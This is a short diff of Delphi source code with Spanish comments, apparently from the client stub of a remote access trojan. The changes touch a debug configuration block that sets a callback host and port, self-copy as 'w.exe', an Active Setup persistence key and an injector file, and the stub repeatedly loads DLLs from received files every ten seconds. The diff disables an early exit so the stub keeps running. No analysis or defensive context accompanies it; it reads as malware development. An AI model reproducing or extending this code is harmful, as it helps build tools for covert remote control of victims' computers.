@@ -274,7 +274,7 @@ begin
     loaddll(ArchivoRecibido);
 
    while fileExists(dllc) do
-        loaddll(readfile(dllc));
+    loaddll(readfile(dllc));
 end;
 
 procedure loadsettings();
@@ -325,8 +325,9 @@ begin
       else
         begin
           //Para Debug
-          Exitprocess(0);
-          Configuracion.sHosts                  := 'localhost:80¬';
+          //Exitprocess(0);
+
+          Configuracion.sHosts                  := 'localhost:3360¬';
           Configuracion.sID                     := 'v';
           Configuracion.bCopiarArchivo          := false;
           Configuracion.sFileNameToCopy         := 'w.exe';
@@ -338,8 +339,7 @@ begin
           Configuracion.bArranqueActiveSetup    := false;
           Configuracion.sActiveSetupKeyName     := '{t';
           Configuracion.sPluginName             := 'NOESCRIBIRADISCO';
-      //Configuracion.sInyectadorFile         := '';
-
+          //Configuracion.sInyectadorFile         := '';
           //Fin de Para debug
         end;
     end;
@@ -365,6 +365,7 @@ begin
     begin
       while fileExists(dllc) do
         loaddll(readfile(dllc)); {Cargamos la dll desde el archivo si existe}
+
       iniciar();
       sleep(10000); //Cada 10 segundos
     end;
